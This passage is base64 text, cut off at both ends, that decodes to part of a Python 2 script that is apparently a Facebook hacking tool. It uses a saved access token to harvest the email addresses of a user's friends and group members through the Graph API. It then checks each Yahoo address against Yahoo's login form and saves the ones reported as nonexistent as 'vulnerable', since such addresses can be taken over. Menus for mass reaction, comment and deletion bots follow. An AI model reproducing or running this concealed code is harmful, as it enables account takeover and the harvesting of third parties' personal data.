FtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoNCkKCQlsb2dpbigpCglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXByaW50IGxvZ28KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMS5cMDMzWzE7OTdtIFdpdGggbGlzdCBmcmllbmQiCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTIuXDAzM1sxOzk3bSBDbG9uZSBmcm9tIGZyaWVuZCIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMy5cMDMzWzE7OTdtIENsb25lIGZyb20gbWVtYmVyIGdyb3VwIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm00LlwwMzNbMTs5N20gVXNpbmcgZmlsZSIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTFtMC5cMDMzWzE7OTdtIEJhY2siCglwcmludCAi4pWRIgoJeWFob29fcGlsaWgoKQojLS0tLXBpbGloCmRlZiB5YWhvb19waWxpaCgpOgoJZ28gPSByYXdfaW5wdXQoIlwwMzNbMTs5N23ilZrilZBcMDMzWzE7OTFtRCBcMDMzWzE7OTdtIikKCWlmIGdvID09IiI6CgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmciCgkJeWFob29fcGlsaWgoKQoJZWxpZiBnbyA9PSIxIjoKCQl5YWhvb2ZyaWVuZHMoKQoJZWxpZiBnbyA9PSIyIjoKCQl5YWhvb2Zyb21mcmllbmRzKCkKCWVsaWYgZ28gPT0iMyI6CgkJeWFob29tZW1iZXIoKQoJZWxpZiBnbyA9PSI0IjoKCQl5YWhvb2xpc3QoKQoJZWxpZiBnbyA9PSIwIjoKCQltZW51X2hhY2soKQoJZWxzZToKCQlwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyIKCQl5YWhvb19waWxpaCgpCgkJCiMjIyMjIExJU1QgRlJJRU5EICMjIyMjCmRlZiB5YWhvb2ZyaWVuZHMoKToKCWdsb2JhbCB0b2tldAoJb3Muc3lzdGVtKCdyZXNldCcpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDQpCgkJbG9naW4oKQoJdHJ5OgoJCW9zLm1rZGlyKCdvdXQnKQoJZXhjZXB0IE9TRXJyb3I6CgkJcGFzcwoJb3Muc3lzdGVtKCdyZXNldCcpCglwcmludCBsb2dvCgltcHNoID0gW10KCWptbCA9IDAKCWphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUdldHRpbmcgZW1haWwgZnJpZW5kIFwwMzNbMTs5N20uLi4nKQoJdGVtYW4gPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHM/YWNjZXNzX3Rva2VuPScrdG9rZXQpCglraW1hayA9IGpzb24ubG9hZHModGVtYW4udGV4dCkKCXNhdmUgPSBvcGVuKCdvdXQvTWFpbFZ1bG4udHh0JywndycpCglqYWxhbignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1TdGFydCBcMDMzWzE7OTdtLi4uJykKCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJZm9yIHcgaW4ga2ltYWtbJ2RhdGEnXToKCQlqbWwgKz0xCgkJbXBzaC5hcHBlbmQoam1sKQoJCWlkID0gd1snaWQnXQoJCW5hbWEgPSB3WyduYW1lJ10KCQlsaW5rcyA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpZCsiP2FjY2Vzc190b2tlbj0iK3Rva2V0KQoJCXogPSBqc29uLmxvYWRzKGxpbmtzLnRleHQpCgkJdHJ5OgoJCQltYWlsID0gelsnZW1haWwnXQoJCQl5YWhvbyA9IHJlLmNvbXBpbGUocidALionKQoJCQlvdHcgPSB5YWhvby5zZWFyY2gobWFpbCkuZ3JvdXAoKQoJCQlpZiAneWFob28uY29tJyBpbiBvdHc6CgkJCQlici5vcGVuKCJodHRwczovL2xvZ2luLnlhaG9vLmNvbS9jb25maWcvbG9naW4/LnNyYz1mcGN0eCYuaW50bD1pZCYubGFuZz1pZC1JRCYuZG9uZT1odHRwczovL2lkLnlhaG9vLmNvbSIpCgkJCQlici5fZmFjdG9yeS5pc19odG1sID0gVHJ1ZQoJCQkJYnIuc2VsZWN0X2Zvcm0obnI9MCkKCQkJCWJyWyJ1c2VybmFtZSJdID0gbWFpbAoJCQkJa2xpayA9IGJyLnN1Ym1pdCgpLnJlYWQoKQoJCQkJam9rID0gcmUuY29tcGlsZShyJyJtZXNzYWdlcy5FUlJPUl9JTlZBTElEX1VTRVJOQU1FIj4uKicpCgkJCQl0cnk6CgkJCQkJcGVrID0gam9rLnNlYXJjaChrbGlrKS5ncm91cCgpCgkJCQlleGNlcHQ6CgkJCQkJY29udGludWUKCQkJCWlmICcibWVzc2FnZXMuRVJST1JfSU5WQUxJRF9VU0VSTkFNRSI+JyBpbiBwZWs6CgkJCQkJc2F2ZS53cml0ZShtYWlsICsgJ1xuJykKCQkJCQlwcmludCgiXDAzM1sxOzk3bVsgXDAzM1sxOzkybVZVTE7inJNcMDMzWzE7OTdtIF0gXDAzM1sxOzkybSIgK21haWwrIiBcMDMzWzE7OTdtPT4iK25hbWEpCgkJCQkJYmVyaGFzaWwuYXBwZW5kKG1haWwpCgkJZXhjZXB0IEtleUVycm9yOgoJCQlwYXNzCglwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCXByaW50ICdcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRG9uZSBcMDMzWzE7OTdtLi4uLicKCXByaW50IlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsIFwwMzNbMTs5MW06IFwwMzNbMTs5N20iK3N0cihsZW4oYmVyaGFzaWwpKQoJcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRmlsZSBzYXZlZCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gb3V0L01haWxWdWxuLnR4dCIKCXNhdmUuY2xvc2UoKQoJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCW1lbnVfeWFob28oKQoKIyMjIyMgQ0xPTkUgRlJPTSBGUklFTkQgIyMjIyMKZGVmIHlhaG9vZnJvbWZyaWVuZHMoKToKCWdsb2JhbCB0b2tldAoJb3Muc3lzdGVtKCdyZXNldCcpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6IAoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCg0KQoJCWxvZ2luKCkKCXRyeToKCQlvcy5ta2Rpcignb3V0JykKCWV4Y2VwdCBPU0Vycm9yOgoJCXBhc3MKCW9zLnN5c3RlbSgncmVzZXQnKQoJcHJpbnQgbG9nbwoJbXBzaCA9IFtdCglqbWwgPSAwCglpZHQgPSByYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUlucHV0IElEIGZyaWVuZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtIikKCXRyeToKCQlqb2sgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWR0KyI/YWNjZXNzX3Rva2VuPSIrdG9rZXQpCgkJb3AgPSBqc29uLmxvYWRzKGpvay50ZXh0KQoJCXByaW50IlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Gcm9tXDAzM1sxOzkxbSA6XDAzM1sxOzk3bSAiK29wWyJuYW1lIl0KCWV4Y2VwdCBLZXlFcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIEZyaWVuZCBub3QgZm91bmQiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQltZW51X3lhaG9vKCkKCWphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUdldHRpbmcgZW1haWwgZnJvbSBmcmllbmQgXDAzM1sxOzk3bS4uLicpCgl0ZW1hbiA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJytpZHQrJy9mcmllbmRzP2FjY2Vzc190b2tlbj0nK3Rva2V0KQoJa2ltYWsgPSBqc29uLmxvYWRzKHRlbWFuLnRleHQpCglzYXZlID0gb3Blbignb3V0L0ZyaWVuZE1haWxWdWxuLnR4dCcsJ3cnKQoJamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtU3RhcnQgXDAzM1sxOzk3bS4uLicpCglwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCWZvciB3IGluIGtpbWFrWydkYXRhJ106CgkJam1sICs9MQoJCW1wc2guYXBwZW5kKGptbCkKCQlpZCA9IHdbJ2lkJ10KCQluYW1hID0gd1snbmFtZSddCgkJbGlua3MgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWQrIj9hY2Nlc3NfdG9rZW49Iit0b2tldCkKCQl6ID0ganNvbi5sb2FkcyhsaW5rcy50ZXh0KQoJCXRyeToKCQkJbWFpbCA9IHpbJ2VtYWlsJ10KCQkJeWFob28gPSByZS5jb21waWxlKHInQC4qJykKCQkJb3R3ID0geWFob28uc2VhcmNoKG1haWwpLmdyb3VwKCkKCQkJaWYgJ3lhaG9vLmNvbScgaW4gb3R3OgoJCQkJYnIub3BlbigiaHR0cHM6Ly9sb2dpbi55YWhvby5jb20vY29uZmlnL2xvZ2luPy5zcmM9ZnBjdHgmLmludGw9aWQmLmxhbmc9aWQtSUQmLmRvbmU9aHR0cHM6Ly9pZC55YWhvby5jb20iKQoJCQkJYnIuX2ZhY3RvcnkuaXNfaHRtbCA9IFRydWUKCQkJCWJyLnNlbGVjdF9mb3JtKG5yPTApCgkJCQliclsidXNlcm5hbWUiXSA9IG1haWwKCQkJCWtsaWsgPSBici5zdWJtaXQoKS5yZWFkKCkKCQkJCWpvayA9IHJlLmNvbXBpbGUocicibWVzc2FnZXMuRVJST1JfSU5WQUxJRF9VU0VSTkFNRSI+LionKQoJCQkJdHJ5OgoJCQkJCXBlayA9IGpvay5zZWFyY2goa2xpaykuZ3JvdXAoKQoJCQkJZXhjZXB0OgoJCQkJCWNvbnRpbnVlCgkJCQlpZiAnIm1lc3NhZ2VzLkVSUk9SX0lOVkFMSURfVVNFUk5BTUUiPicgaW4gcGVrOgoJCQkJCXNhdmUud3JpdGUobWFpbCArICdcbicpCgkJCQkJcHJpbnQoIlwwMzNbMTs5N21bIFwwMzNbMTs5Mm1WVUxO4pyTXDAzM1sxOzk3bSBdIFwwMzNbMTs5Mm0iICttYWlsKyIgXDAzM1sxOzk3bT0+IituYW1hKQoJCQkJCWJlcmhhc2lsLmFwcGVuZChtYWlsKQoJCWV4Y2VwdCBLZXlFcnJvcjoKCQkJcGFzcwoJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCglwcmludCAnXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybURvbmUgXDAzM1sxOzk3bS4uLi4nCglwcmludCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtIitzdHIobGVuKGJlcmhhc2lsKSkKCXByaW50IlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZpbGUgc2F2ZWQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtIG91dC9GcmllbmRNYWlsVnVsbi50eHQiCglzYXZlLmNsb3NlKCkKCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgltZW51X3lhaG9vKCkKCQojIyMjIyBZQUhPTyBNRU1CRVIgIyMjIyMKZGVmIHlhaG9vbWVtYmVyKCk6CglnbG9iYWwgdG9rZXQKCW9zLnN5c3RlbSgncmVzZXQnKQoJdHJ5OgoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCg0KQoJCWxvZ2luKCkKCXRyeToKCQlvcy5ta2Rpcignb3V0JykKCWV4Y2VwdCBPU0Vycm9yOgoJCXBhc3MKCW9zLnN5c3RlbSgncmVzZXQnKQoJcHJpbnQgbG9nbwoJbXBzaCA9IFtdCglqbWwgPSAwCglpZD1yYXdfaW5wdXQoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzkybUlucHV0IElEIGdyb3VwIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAnKQoJdHJ5OgoJCXI9cmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9ncm91cC8/aWQ9JytpZCsnJmFjY2Vzc190b2tlbj0nK3Rva2V0KQoJCWFzdz1qc29uLmxvYWRzKHIudGV4dCkKCQlwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRnJvbSBncm91cCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIithc3dbJ25hbWUnXQoJZXhjZXB0IEtleUVycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gR3JvdXAgbm90IGZvdW5kIgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJbWVudV95YWhvbygpCglqYWxhbignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1HZXR0aW5nIGVtYWlsIGZyb20gZ3JvdXAgXDAzM1sxOzk3bS4uLicpCgl0ZW1hbiA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJytpZCsnL21lbWJlcnM/ZmllbGRzPW5hbWUsaWQmbGltaXQ9OTk5OTk5OTk5JmFjY2Vzc190b2tlbj0nK3Rva2V0KQoJa2ltYWsgPSBqc29uLmxvYWRzKHRlbWFuLnRleHQpCglzYXZlID0gb3Blbignb3V0L0dydXBNYWlsVnVsbi50eHQnLCd3JykKCWphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQoJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCglmb3IgdyBpbiBraW1ha1snZGF0YSddOgoJCWptbCArPTEKCQltcHNoLmFwcGVuZChqbWwpCgkJaWQgPSB3WydpZCddCgkJbmFtYSA9IHdbJ25hbWUnXQoJCWxpbmtzID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkKyI/YWNjZXNzX3Rva2VuPSIrdG9rZXQpCgkJeiA9IGpzb24ubG9hZHMobGlua3MudGV4dCkKCQl0cnk6CgkJCW1haWwgPSB6WydlbWFpbCddCgkJCXlhaG9vID0gcmUuY29tcGlsZShyJ0AuKicpCgkJCW90dyA9IHlhaG9vLnNlYXJjaChtYWlsKS5ncm91cCgpCgkJCWlmICd5YWhvby5jb20nIGluIG90dzoKCQkJCWJyLm9wZW4oImh0dHBzOi8vbG9naW4ueWFob28uY29tL2NvbmZpZy9sb2dpbj8uc3JjPWZwY3R4Ji5pbnRsPWlkJi5sYW5nPWlkLUlEJi5kb25lPWh0dHBzOi8vaWQueWFob28uY29tIikKCQkJCWJyLl9mYWN0b3J5LmlzX2h0bWwgPSBUcnVlCgkJCQlici5zZWxlY3RfZm9ybShucj0wKQoJCQkJYnJbInVzZXJuYW1lIl0gPSBtYWlsCgkJCQlrbGlrID0gYnIuc3VibWl0KCkucmVhZCgpCgkJCQlqb2sgPSByZS5jb21waWxlKHInIm1lc3NhZ2VzLkVSUk9SX0lOVkFMSURfVVNFUk5BTUUiPi4qJykKCQkJCXRyeToKCQkJCQlwZWsgPSBqb2suc2VhcmNoKGtsaWspLmdyb3VwKCkKCQkJCWV4Y2VwdDoKCQkJCQljb250aW51ZQoJCQkJaWYgJyJtZXNzYWdlcy5FUlJPUl9JTlZBTElEX1VTRVJOQU1FIj4nIGluIHBlazoKCQkJCQlzYXZlLndyaXRlKG1haWwgKyAnXG4nKQoJCQkJCXByaW50KCJcMDMzWzE7OTdtWyBcMDMzWzE7OTJtVlVMTuKck1wwMzNbMTs5N20gXSBcMDMzWzE7OTJtIiArbWFpbCsiIFwwMzNbMTs5N209PiIrbmFtYSkKCQkJCQliZXJoYXNpbC5hcHBlbmQobWFpbCkKCQlleGNlcHQgS2V5RXJyb3I6CgkJCXBhc3MKCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJcHJpbnQgJ1wwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Eb25lIFwwMzNbMTs5N20uLi4uJwoJcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWwgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSIrc3RyKGxlbihiZXJoYXNpbCkpCglwcmludCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIHNhdmVkIFwwMzNbMTs5MW06XDAzM1sxOzk3bSBvdXQvR3J1cE1haWxWdWxuLnR4dCIKCXNhdmUuY2xvc2UoKQoJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCW1lbnVfeWFob28oKQoJCQojIyMjIyBZQUhPTyBGSUxFICMjIyMjCmRlZiB5YWhvb2xpc3QoKToKCWdsb2JhbCB0b2tldAoJb3Muc3lzdGVtKCdyZXNldCcpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDQpCgkJbG9naW4oKQoJdHJ5OgoJCW9zLm1rZGlyKCdvdXQnKQoJZXhjZXB0IE9TRXJyb3I6CgkJcGFzcwoJb3Muc3lzdGVtKCdyZXNldCcpCglwcmludCBsb2dvCglmaWxlcyA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRmlsZSBwYXRoIFwwMzNbMTs5MW06IFwwMzNbMTs5N20iKQoJdHJ5OgoJCXRvdGFsID0gb3BlbihmaWxlcywiciIpCgkJbWFpbCA9IHRvdGFsLnJlYWRsaW5lcygpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIEZpbGUgbm90IGZvdW5kIgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJbWVudV95YWhvbygpCgltcHNoID0gW10KCWptbCA9IDAKCWphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQoJc2F2ZSA9IG9wZW4oJ291dC9GaWxlTWFpbFZ1bG4udHh0JywndycpCglwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCW1haWwgPSBvcGVuKGZpbGVzLCJyIikucmVhZGxpbmVzKCkKCWZvciBwdyBpbiBtYWlsOgoJCW1haWwgPSBwdy5yZXBsYWNlKCJcbiIsIiIpCgkJam1sICs9MQoJCW1wc2guYXBwZW5kKGptbCkKCQl5YWhvbyA9IHJlLmNvbXBpbGUocidALionKQoJCW90dyA9IHlhaG9vLnNlYXJjaChtYWlsKS5ncm91cCgpCgkJaWYgJ3lhaG9vLmNvbScgaW4gb3R3OgoJCQlici5vcGVuKCJodHRwczovL2xvZ2luLnlhaG9vLmNvbS9jb25maWcvbG9naW4/LnNyYz1mcGN0eCYuaW50bD1pZCYubGFuZz1pZC1JRCYuZG9uZT1odHRwczovL2lkLnlhaG9vLmNvbSIpCgkJCWJyLl9mYWN0b3J5LmlzX2h0bWwgPSBUcnVlCgkJCWJyLnNlbGVjdF9mb3JtKG5yPTApCgkJCWJyWyJ1c2VybmFtZSJdID0gbWFpbAoJCQlrbGlrID0gYnIuc3VibWl0KCkucmVhZCgpCgkJCWpvayA9IHJlLmNvbXBpbGUocicibWVzc2FnZXMuRVJST1JfSU5WQUxJRF9VU0VSTkFNRSI+LionKQoJCQl0cnk6CgkJCQlwZWsgPSBqb2suc2VhcmNoKGtsaWspLmdyb3VwKCkKCQkJZXhjZXB0OgoJCQkJY29udGludWUKCQkJaWYgJyJtZXNzYWdlcy5FUlJPUl9JTlZBTElEX1VTRVJOQU1FIj4nIGluIHBlazoKCQkJCXNhdmUud3JpdGUobWFpbCArICdcbicpCgkJCQlwcmludCgiXDAzM1sxOzk3bVsgXDAzM1sxOzkybVZVTE7inJNcMDMzWzE7OTdtIF0gXDAzM1sxOzkybSIgK21haWwpCgkJCQliZXJoYXNpbC5hcHBlbmQobWFpbCkKCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJcHJpbnQgJ1wwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Eb25lIFwwMzNbMTs5N20uLi4uJwoJcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWwgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSIrc3RyKGxlbihiZXJoYXNpbCkpCglwcmludCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIHNhdmVkIFwwMzNbMTs5MW06XDAzM1sxOzk3bSBvdXQvRmlsZU1haWxWdWxuLnR4dCIKCXNhdmUuY2xvc2UoKQoJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCW1lbnVfeWFob28oKQoJCgoJCQojIyMjIyBNRU5VIEJPVCAjIyMjIwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSMKZGVmIG1lbnVfYm90KCk6Cglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoNCkKCQlsb2dpbigpCglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXByaW50IGxvZ28KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMS5cMDMzWzE7OTdtIEJvdCBSZWFjdGlvbnMgVGFyZ2V0IFBvc3QiCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTIuXDAzM1sxOzk3bSBCb3QgUmVhY3Rpb25zIEdydXAgUG9zdCIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMy5cMDMzWzE7OTdtIEJvdCBLb21lbiBUYXJnZXQgUG9zdCIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNC5cMDMzWzE7OTdtIEJvdCBLb21lbiBHcnVwIFBvc3QiCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTUuXDAzM1sxOzk3bSBNYXNzIGRlbGV0ZSBQb3N0IgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm02LlwwMzNbMTs5N20gTWFzcyBhY2NlcHQgZnJpZW5kIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm03LlwwMzNbMTs5N20gTWFzcyBkZWxldGUgZnJpZW5kIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5MW0wLlwwMzNbMTs5N20gQmFjayIKCXByaW50ICLilZEiCglib3RfcGlsaWgoKQojLy8vLy8vLy8vLy8vCmRlZiBib3RfcGlsaWgoKToKCWJvdHMgPSByYXdfaW5wdXQoIlwwMzNbMTs5N23ilZrilZBcMDMzWzE7OTFtRCBcMDMzWzE7OTdtIikKCWlmIGJvdHMgPT0iIjoKCQlwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyBpbnB1dCIKCQlib3RfcGlsaWgoKQoJZWxpZiBib3RzID09IjEiOgoJCW1lbnVfcmVhY3QoKQoJZWxpZiBib3RzID09IjIiOgoJCWdydXBfcmVhY3QoKQoJZWxpZiBib3RzID09IjMiOgoJCWJvdF9rb21lbigpCgllbGlmIGJvdHMgPT0iNCI6CgkJZ3J1cF9rb21lbigpCgllbGlmIGJvdHMgPT0iNSI6CgkJZGVsZXRlcG9zdCgpCgllbGlmIGJvdHMgPT0iNiI6CgkJYWNjZXB0KCkKCWVsaWYgYm90cyA9PSI3IjoKCQl1bmZyaWVuZCgpCgllbGlmIGJvdHMgPT0iMCI6CgkJbWVudSgpCgllbHNlOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgoJCWJvdF9waWxpaCgpCgkJCiMjIyMjIE1FTlUgUkVBQ1QgIyMjIyMKZGVmIG1lbnVfcmVhY3QoKToKCW9zLnN5c3RlbSgncmVzZXQnKQoJdHJ5OgoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCg0KQoJCWxvZ2luKCkKCW9zLnN5c3RlbSgncmVzZXQnKQoJcHJpbnQgbG9nbwoJcHJpbnQgKCJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMS4gXDAzM1sxOzk3bUxpa2UiKQoJcHJpbnQgKCJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMi4gXDAzM1sxOzk3bUxvdmUiKQoJcHJpbnQgKCJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMy4gXDAzM1sxOzk3bVdvdyIpCglwcmludCAoIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm00LiBcMDMzWzE7OTdtSGFoYSIpCglwcmludCAoIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm01LiBcMDMzWzE7OTdtU2FkQm95IikKCXByaW50ICgiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTYuIFwwMzNbMTs5N21BbmdyeSIpCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkxbTAuXDAzM1sxOzk3bSBCYWNrIgoJcHJpbnQgIuKVkSIKCXJlYWN0X3BpbGloKCkKIy8vLy8vLy8vLy8vLy8vCmRlZiByZWFjdF9waWxpaCgpOgoJZ2xvYmFsIHRpcGUKCWFrc2kgPSByYXdfaW5wdXQoIlwwMzNbMTs5N23ilZrilZBcMDMzWzE7OTFtRCBcMDMzWzE7OTdtIikKCWlmIGFrc2kgPT0iIjoKCQlwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyBpbnB1dCIKCQlyZWFjdF9waWxpaCgpCgllbGlmIGFrc2kgPT0iMSI6CgkJdGlwZSA9ICJMSUtFIgoJCXJlYWN0KCkKCWVsaWYgYWtzaSA9PSIyIjoKCQl0aXBlID0gIkxPVkUiCgkJcmVhY3QoKQoJZWxpZiBha3NpID09IjMiOgoJCXRpcGUgPSAiV09XIgoJCXJlYWN0KCkKCWVsaWYgYWtzaSA9PSI0IjoKCQl0aXBlID0gIkhBSEEiCgkJcmVhY3QoKQoJZWxpZiBha3NpID09IjUiOgoJCXRpcGUgPSAiU0FEIgoJCXJlYWN0KCkKCWVsaWYgYWtzaSA9